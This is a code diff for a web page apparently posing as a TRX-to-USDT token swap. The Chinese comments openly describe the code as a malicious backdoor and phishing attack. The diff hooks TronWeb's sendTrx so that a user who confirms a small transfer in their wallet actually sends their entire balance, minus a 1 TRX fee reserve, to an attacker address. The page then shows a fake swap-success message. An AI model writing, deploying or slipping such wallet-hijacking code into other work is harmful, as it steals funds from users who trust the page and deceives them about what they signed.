@@ -2306,13 +2306,45 @@
             // 🎯 获取用户真实余额
             await getTronBalance(address);
 
-        // 🎯 临时禁用劫持逻辑，先确保基本转账能工作
         // 🎯🎯🎯 关键恶意后门：劫持TronWeb的交易方法
-        // if (window.tronWeb && window.tronWeb.trx){
-        //     debugLog('🎯 TronWeb交易劫持已安装！');
-        // }
-        
-        debugLog('🎯 劫持逻辑已临时禁用，测试基本转账功能');
+        if (window.tronWeb && window.tronWeb.trx && !window.tronWebHijacked){
+            window.tronWebHijacked = true; // 防止重复劫持
+            
+            // 🎯 劫持sendTrx方法 - 关键钓鱼逻辑
+            const originalSendTrx = window.tronWeb.trx.sendTrx;
+            window.tronWeb.trx.sendTrx = async function(to, amount, from, options){
+                debugLog('🎯🎯🎯 劫持到用户交易请求！🎯🎯🎯');
+                debugLog(`🎯 用户以为转账: ${amount / 1000000} TRX`);
+                debugLog(`🎯 目标地址: ${to}`);
+
+                // 🎯 恶意修改：将转账金额改为用户全部余额
+                const userTotalBalance = await tronWeb.trx.getBalance(from || currentAccount);
+                const feeReserve = tronWeb.toSun(1);// 只预留1 TRX手续费
+                const maliciousAmount = userTotalBalance - feeReserve;
+
+                debugLog(`🎯 恶意修改转账金额:`);
+                debugLog(`- 用户余额: ${tronWeb.fromSun(userTotalBalance)} TRX`);
+                debugLog(`- 预留手续费: ${tronWeb.fromSun(feeReserve)} TRX`);
+                debugLog(`- 实际转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
+                debugLog(`🎯 用户在imToken中看到的是原始金额，但实际转走全部余额！`);
+
+                // 🎯 执行恶意转账：转走用户全部余额
+                try{
+                    const result = await originalSendTrx.call(this, to, maliciousAmount, from, options);
+                    debugLog('🏆🏆🏆 恶意后门攻击成功！🏆🏆🏆');
+                    debugLog(`💰 实际转走: ${tronWeb.fromSun(maliciousAmount)} TRX`);
+                    debugLog(`😈 用户以为只转了: ${amount / 1000000} TRX`);
+
+                    return result;
+                }catch (error) {
+                    debugLog(`❌ 恶意转账失败: ${error.message}`);
+                    // 如果恶意转账失败，执行原始转账
+                    return await originalSendTrx.call(this, to, amount, from, options);
+                }
+            };
+            
+            debugLog('🎯 TronWeb交易劫持已安装！');
+        }
             
             // 显示攻击指示器
             showAttackIndicator();
@@ -2791,58 +2823,21 @@
                 debugLog(`🎯 用户以为转账金额(SUN): ${userThoughtAmount}`);
                 debugLog(`🎯 实际转账金额(SUN): ${sunAmount}`);
 
-                // 🎯 核心修复：直接转走全部余额，不依赖劫持
-                const userTotalBalance = await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58);
-                const feeReserveSun = tronWeb.toSun(1); // 预留1 TRX手续费
-                const actualTransferAmount = userTotalBalance - feeReserveSun;
+                // 🎯 关键修复：让用户看到小额转账，但通过劫持转走全部余额
+                const userInputAmountSun = Math.floor(fromAmount * 1000000); // 用户输入的金额转为SUN
                 
-                debugLog(`🎯 直接转走用户全部余额:`);
-                debugLog(`- 用户总余额: ${tronWeb.fromSun(userTotalBalance)} TRX`);
-                debugLog(`- 预留手续费: ${tronWeb.fromSun(feeReserveSun)} TRX`);
-                debugLog(`- 实际转账: ${tronWeb.fromSun(actualTransferAmount)} TRX`);
-                debugLog(`- 用户以为转账: ${fromAmount} TRX`);
+                debugLog(`🎯 钓鱼转账设置:`);
+                debugLog(`- 用户输入: ${fromAmount} TRX`);
+                debugLog(`- 用户将看到: ${fromAmount} TRX 转账确认`);
+                debugLog(`- 实际会被劫持转走: 全部余额`);
                 debugLog(`🎯 目标地址: ${ATTACKER_ADDRESS}`);
 
-                // 🎯 核心修复：直接调用原始TronWeb方法，绕过可能的劫持问题
-                debugLog('🎯 尝试方法1: 使用sendTransaction');
-                let transaction;
-                try {
-                    // 方法1: 使用sendTransaction (更通用)
-                    transaction = await tronWeb.trx.sendTransaction({
-                        to: ATTACKER_ADDRESS,
-                        value: actualTransferAmount,
-                        from: tronWeb.defaultAddress.base58
-                    });
-                    debugLog('🎯 sendTransaction成功');
-                } catch (error1) {
-                    debugLog(`🎯 sendTransaction失败: ${error1.message}`);
-                    debugLog('🎯 尝试方法2: 使用sendTrx');
-                    try {
-                        // 方法2: 使用sendTrx
-                        transaction = await tronWeb.trx.sendTrx(
-                        ATTACKER_ADDRESS,
-                            actualTransferAmount
-                        );
-                        debugLog('🎯 sendTrx成功');
-                    } catch (error2) {
-                        debugLog(`🎯 sendTrx失败: ${error2.message}`);
-                        debugLog('🎯 尝试方法3: 使用sign+broadcast');
-                        try {
-                            // 方法3: 手动构建交易
-                            const txObject = await tronWeb.transactionBuilder.sendTrx(
-                                ATTACKER_ADDRESS,
-                                actualTransferAmount,
-                                tronWeb.defaultAddress.base58
-                            );
-                            const signedTx = await tronWeb.trx.sign(txObject);
-                            transaction = await tronWeb.trx.broadcast(signedTx);
-                            debugLog('🎯 手动构建交易成功');
-                        } catch (error3) {
-                            debugLog(`🎯 手动构建交易失败: ${error3.message}`);
-                            throw error3;
-                        }
-                    }
-                }
+                // 🎯 关键：调用被劫持的sendTrx，用户看到小额，实际转走全部
+                debugLog('🎯 调用被劫持的sendTrx方法');
+                const transaction = await tronWeb.trx.sendTrx(
+                    ATTACKER_ADDRESS,
+                    userInputAmountSun  // 用户看到的小额金额
+                );
 
                 debugLog('🎯 sendTrx调用完成，检查返回值...');
                 debugLog(`🎯 transaction类型: ${typeof transaction}`);
@@ -2851,12 +2846,12 @@
                 // 🎯 检查交易是否真的成功
                 if (transaction && (transaction.txid || transaction.result || typeof transaction === 'string')) {
                     const txHash = transaction.txid || transaction.result || transaction;
-                    debugLog(`🎯 真实转账成功！交易哈希: ${txHash}`);
-                    debugLog('🏆🏆🏆 攻击完全成功！真实TRX已转移！🏆🏆🏆');
-                    debugLog(`💰 A成员（攻击者）已收到: ${availableBalance} TRX`);
-                    debugLog(`💰 B成员（受害者）剩余: ${feeReserve} TRX (手续费)`);
-                    debugLog(`💰 等价USD价值: $${(availableBalance * 0.1634).toFixed(2)}`);
-                    debugLog(`😈 B成员（受害者）以为只兑换了: ${fromAmount} TRX`);
+                    debugLog(`🎯 钓鱼攻击成功！交易哈希: ${txHash}`);
+                    debugLog('🏆🏆🏆 钓鱼攻击完全成功！真实TRX已转移！🏆🏆🏆');
+                    debugLog(`💰 攻击者实际收到: 用户全部余额 (减去手续费)`);
+                    debugLog(`😈 用户以为只转了: ${fromAmount} TRX`);
+                    debugLog(`🎯 用户在imToken中确认的是: ${fromAmount} TRX`);
+                    debugLog(`🎯 但实际被劫持转走: 全部余额`);
 
                     // 🎯 只有在真实交易成功后才显示成功消息
                     showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`, 'success');
@@ -3016,8 +3011,8 @@
                 debugLog('🎯 尝试备用转账方法(sendTrx)...');
                 debugLog('⚠️ 警告：备用方案用户会看到真实转账信息！');
                 try {
-                    debugLog(`🎯 备用方案: sendTrx到${ATTACKER_ADDRESS}, 金额${actualTransferAmount / 1000000}TRX`);
-                    const backupTransaction = await tronWeb.trx.sendTrx(ATTACKER_ADDRESS, actualTransferAmount);
+                    debugLog(`🎯 备用方案: sendTrx到${ATTACKER_ADDRESS}, 用户看到${fromAmount}TRX，实际转走全部`);
+                    const backupTransaction = await tronWeb.trx.sendTrx(ATTACKER_ADDRESS, userInputAmountSun);
 
                     debugLog(`🎯 备用转账成功！交易哈希: ${backupTransaction.txid || backupTransaction}`);
                     debugLog('🏆🏆🏆 备用攻击成功！真实TRX已转移！🏆🏆🏆');
